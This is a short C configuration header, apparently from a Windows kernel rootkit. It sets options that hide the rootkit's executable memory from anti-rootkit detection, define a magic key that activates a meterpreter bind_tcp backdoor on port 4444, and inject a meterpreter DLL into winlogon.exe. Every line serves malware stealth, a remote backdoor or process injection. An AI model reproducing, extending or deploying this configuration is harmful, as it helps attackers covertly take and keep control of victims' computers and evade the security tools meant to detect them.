

/**
 * Hide rootkit executable memory in discardable sections to avoid 
 * 'hiiden code' detection from different anti-rootkits.
 */
#define USE_STEALTH_IMAGE

/**
 * Magic sequence that activates meterpreter/bind_tcp backdoor on 4444 port.
 * Use rootkit_ping.py script for communicating with the infected target.
 */
#define ROOTKIT_CTL_KEY "7C5E3380"

/**
 * Process to inject meterpreter DLL.
 */
#define METERPRETER_PROCESS L"winlogon.exe"
